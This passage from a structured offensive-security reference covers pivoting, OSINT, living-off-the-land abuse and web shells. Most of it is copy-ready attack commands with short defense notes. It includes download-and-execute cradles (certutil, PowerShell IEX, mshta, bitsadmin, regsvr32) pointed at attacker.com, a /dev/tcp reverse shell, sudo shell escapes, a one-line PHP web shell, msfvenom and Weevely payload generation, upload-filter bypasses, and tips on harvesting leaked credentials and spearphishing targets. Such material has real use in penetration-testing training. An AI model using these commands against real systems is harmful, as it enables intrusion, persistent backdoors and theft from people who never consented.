
  # ════════════════════════════════════════════════════════
  # MASTERY BLOCK 2 — POST-EXPLOITATION & PIVOTING
  # ════════════════════════════════════════════════════════

  "pivoting": {
    "title": "Pivoting & Port Forwarding — Moving Through Segmented Networks",
    "tldr": "Using a compromised host as a relay to attack systems that aren't directly accessible from your machine. The art of tunneling through your target.",
    "what": (
      "Pivoting is the technique of using a compromised host to access other network segments "
      "that would otherwise be unreachable. Enterprise networks are segmented — your Kali box "
      "can't reach the internal database tier directly, but the web server you just compromised "
      "can. Pivoting routes your attack traffic through that compromised host."
    ),
    "how": (
      "Pivoting techniques:\n"
      "  SSH Port Forwarding: Tunnel traffic through an SSH connection\n"
      "    Local: -L localport:target_host:target_port (access remote host locally)\n"
      "    Remote: -R remoteport:localhost:localport (expose local port on remote host)\n"
      "    Dynamic: -D port (SOCKS proxy through remote host)\n"
      "  Meterpreter autoroute: Add internal routes through compromised session\n"
      "  Chisel: Fast TCP/UDP tunneling over HTTP/S\n"
      "  Ligolo-ng: TUN interface tunneling — most transparent option\n"
      "  ProxyChains: Route any tool through a SOCKS4/5 proxy chain"
    ),
    "commands": {
      "SSH local forward":          "ssh -L 8080:internal_host:80 user@pivot_host",
      "SSH dynamic (SOCKS)":        "ssh -D 9050 user@pivot_host  # then use proxychains",
      "ProxyChains config":         "echo 'socks5 127.0.0.1 9050' >> /etc/proxychains4.conf",
      "ProxyChains nmap":           "proxychains nmap -sT -Pn 10.10.10.0/24",
      "MSF autoroute":              "run post/multi/manage/autoroute SUBNET=10.10.10.0/24",
      "MSF SOCKS proxy":            "use auxiliary/server/socks_proxy; set SRVPORT 9050; run",
      "Chisel server":              "chisel server --reverse --port 8888  # on your Kali",
      "Chisel client":              "chisel client KALI_IP:8888 R:9050:socks  # on target",
      "Ligolo setup":               "# See ligolo-ng docs — creates TUN interface on Kali",
      "SSH remote forward":         "ssh -R 9001:localhost:4444 kali@YOUR_IP  # reverse shell through SSH",
    },
    "tools": {
      "Chisel":      "Fast HTTP tunneling tool — works through restrictive firewalls",
      "Ligolo-ng":   "Transparent pivoting via TUN interface — fastest for multi-hop",
      "ProxyChains": "Routes any TCP tool through SOCKS/HTTP proxy",
      "sshuttle":    "VPN-like pivoting over SSH — routes entire subnets",
      "Metasploit":  "autoroute + portfwd for Meterpreter-based pivoting",
    },
    "defense": "Network segmentation (zero-trust), internal firewalls between tiers, monitor for SSH tunneling, EDR behavioral detection, disable unused protocols",
    "tips": [
      "Ligolo-ng is the cleanest option — creates a real TUN interface, no proxychains needed",
      "Dynamic SSH (-D) + proxychains means ANY tool works through the pivot",
      "Multi-hop pivoting: chain chisel clients through multiple compromised hosts",
      "Always check: what can THIS host reach that YOUR host can't?",
    ],
  },

  "osint": {
    "title": "OSINT — Open Source Intelligence & Passive Recon",
    "tldr": "Gathering intelligence about targets using publicly available sources before touching anything. The safest recon phase.",
    "what": (
      "OSINT (Open Source Intelligence) is the collection and analysis of information from "
      "publicly available sources — search engines, social media, WHOIS, certificate logs, "
      "job postings, and more. Zero direct interaction with the target means zero detection risk. "
      "A good OSINT phase reveals attack surface, employees, technologies, and credentials "
      "before you scan a single port."
    ),
    "how": (
      "OSINT categories:\n"
      "  People: LinkedIn, social media, email formats, org chart\n"
      "  Infrastructure: WHOIS, DNS records, Shodan, Censys, netblocks\n"
      "  Subdomains: Certificate Transparency logs (crt.sh), subfinder\n"
      "  Code: GitHub/GitLab leaks, API keys, internal URLs, credentials\n"
      "  Email: Hunter.io, TheHarvester — build target list for phishing\n"
      "  Breaches: HaveIBeenPwned API, DeHashed — find leaked creds\n"
      "  Technology: Wappalyzer, BuiltWith, Shodan — what tech is running"
    ),
    "commands": {
      "Subfinder":               "subfinder -d target.com -all -o subdomains.txt",
      "TheHarvester emails":     "theHarvester -d target.com -b google,linkedin,hunter -f output",
      "crt.sh subdomains":       "curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq '.[].name_value'",
      "Shodan search":           "shodan search 'org:\"Target Corp\" port:22'",
      "WHOIS":                   "whois target.com",
      "DNS enum":                "dig ANY target.com @8.8.8.8",
      "GitHub dork":             "# site:github.com target.com password OR apikey OR secret",
      "Email format guesser":    "# hunter.io → find email format → firstname.lastname@target.com",
      "Breach check":            "# haveibeenpwned.com API + dehashed.com for leaked creds",
      "Google dorks":            "# site:target.com filetype:pdf | filetype:xlsx | inurl:admin",
    },
    "tools": {
      "Maltego":      "Visual link analysis — maps relationships between entities",
      "Shodan":       "Search engine for internet-connected devices",
      "TheHarvester": "Email, subdomain, and people OSINT aggregator",
      "Recon-ng":     "Web reconnaissance framework with modules",
      "OSINT Framework": "osintframework.com — map of all OSINT tools by category",
      "spiderfoot":   "Automated OSINT footprinting tool",
    },
    "defense": "Minimize public exposure, remove metadata from documents, use corporate email format consistently, monitor for credential leaks on HaveIBeenPwned, review GitHub repos for sensitive data",
    "tips": [
      "OSINT before ANY scanning — you don't need to touch the target to learn a lot",
      "Check GitHub for leaked API keys, passwords, and internal hostnames",
      "Job postings reveal tech stack — 'Experience with Splunk, Palo Alto, CrowdStrike' = that's what they use",
      "LinkedIn reveals the org chart, email format, and who to spearphish",
      "crt.sh certificate transparency logs expose ALL subdomains ever registered",
    ],
  },

  "living off the land": {
    "title": "Living Off the Land (LOTL) — Using Built-in OS Tools for Attacks",
    "tldr": "Using legitimate OS binaries for malicious purposes. Bypasses AV/EDR because you're running signed Microsoft tools.",
    "what": (
      "Living Off the Land means using pre-installed, legitimate operating system tools for "
      "attack purposes. Because these binaries are signed by Microsoft (Windows) or are part of "
      "the OS (Linux), signature-based AV won't flag them. LOLBAS (Windows) and GTFOBins (Linux) "
      "catalog every known abuse technique for built-in binaries."
    ),
    "how": (
      "Why LOTL bypasses defenses:\n"
      "  AV signatures look for malicious files — these ARE the OS\n"
      "  Application whitelisting often allows these binaries\n"
      "  They blend into normal admin activity\n"
      "  They're already on every target by default — no need to upload tools\n\n"
      "Common Windows LOLBAS techniques:\n"
      "  certutil: Download files, decode Base64, compute hashes\n"
      "  powershell: IEX cradles, download-execute, AMSI bypass\n"
      "  mshta: Execute remote VBScript/HTA files\n"
      "  regsvr32: Execute remote COM scriptlets (Squiblydoo)\n"
      "  wmic: Process creation, remote execution\n"
      "  bitsadmin: Download files as a background job\n"
      "  rundll32: Execute DLLs and JavaScript\n\n"
      "Common Linux GTFOBins techniques:\n"
      "  sudo vim/less/more: Shell escape via :!/bin/bash\n"
      "  find -exec: Execute arbitrary commands as root\n"
      "  python/perl/ruby: Spawn shells if sudo-allowed\n"
      "  nmap --script: Execute scripts as root via sudo nmap"
    ),
    "commands": {
      "[WIN] certutil download":       "certutil -urlcache -split -f http://attacker.com/shell.exe C:\\shell.exe",
      "[WIN] certutil base64 decode":  "certutil -decode encoded.b64 decoded.exe",
      "[WIN] PS IEX cradle":           "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"",
      "[WIN] mshta remote execution":  "mshta http://attacker.com/payload.hta",
      "[WIN] bitsadmin download":      "bitsadmin /transfer job /download /priority high http://attacker.com/file.exe C:\\file.exe",
      "[WIN] regsvr32 Squiblydoo":     "regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll",
      "[LIN] sudo find shell escape":  "sudo find . -exec /bin/bash \\; -quit",
      "[LIN] sudo vim shell escape":   "sudo vim -c ':!/bin/bash'",
      "[LIN] python sudo shell":       "sudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
      "[LIN] nmap script exec":        "echo 'os.execute(\"/bin/bash\")' > /tmp/shell.nse && sudo nmap --script /tmp/shell.nse",
    },
    "tools": {
      "LOLBAS":    "https://lolbas-project.github.io — Windows LOL binaries catalog",
      "GTFOBins":  "https://gtfobins.github.io — Linux/Unix privilege escalation via built-in tools",
    },
    "defense": "PowerShell Constrained Language Mode, AMSI, Script Block Logging, AppLocker/WDAC policies, Sysmon rules for suspicious binary behavior, behavioral EDR",
    "tips": [
      "GTFOBins is your first stop after 'sudo -l' on any Linux box",
      "LOLBAS is your first stop when you can't upload custom tools on Windows",
      "Script Block Logging catches PowerShell LOTL — check if it's enabled on target",
      "AMSI (Antimalware Scan Interface) patches memory — PowerShell payloads must bypass it",
    ],
  },

  "web shells": {
    "title": "Web Shells — Backdooring Web Servers for Persistent Access",
    "tldr": "Uploading malicious server-side scripts that execute OS commands through the web server. Remote code execution via HTTP.",
    "what": (
      "A web shell is a script uploaded to a web server that provides remote code execution "
      "through HTTP requests. Once uploaded, the attacker sends commands as HTTP parameters "
      "and gets the output back. They're persistent, hard to detect, and work through "
      "firewalls because the traffic looks like normal web traffic."
    ),
    "how": (
      "Web shell attack path:\n"
      "  1. Find a file upload vulnerability (no validation on file type/extension)\n"
      "  2. Upload web shell (PHP, ASP, ASPX, JSP depending on server tech)\n"
      "  3. Access it via browser or curl: http://target.com/uploads/shell.php?cmd=whoami\n"
      "  4. Upgrade to full interactive reverse shell\n\n"
      "Upload bypass techniques:\n"
      "  Change extension: .php → .php5, .phtml, .phar, .php3\n"
      "  Double extension: shell.php.jpg\n"
      "  Null byte: shell.php%00.jpg\n"
      "  MIME type: Change Content-Type to image/jpeg\n"
      "  Magic bytes: Add GIF89a to start of PHP file"
    ),
    "commands": {
      "Simple PHP web shell":       "<?php system($_GET['cmd']); ?>",
      "PHP reverse shell trigger":  "http://target.com/shell.php?cmd=bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261",
      "Curl command execution":     "curl 'http://target.com/shell.php?cmd=id'",
      "Upload bypass (Burp)":       "# Change Content-Type: application/octet-stream → image/jpeg",
      "PentestMonkey PHP shell":    "# /usr/share/webshells/php/php-reverse-shell.php (edit IP/port)",
      "ASPX shell (Windows IIS)":   "# /usr/share/webshells/aspx/ in Kali",
      "msfvenom PHP shell":         "msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php",
      "Weevely (stealth PHP shell)":"weevely generate password ./shell.php && weevely http://target.com/shell.php password",
    },
    "defense": "File type validation (whitelist, not blacklist), store uploads outside webroot, execute permissions on upload dir disabled, WAF, file content scanning (magic bytes), rename uploaded files",
    "tips": [
      "Always try changing the extension — many filters only check file extension",
      "Weevely generates encoded PHP shells that look like garbage text",
      "Check for ImageMagick — it can be exploited via malicious image upload (ImageTragick)",
      "Look for upload bypass via Content-Type header manipulation in Burp",
      "Web shells in /tmp, /var/www/uploads, /images — check common locations",
    ],
  },

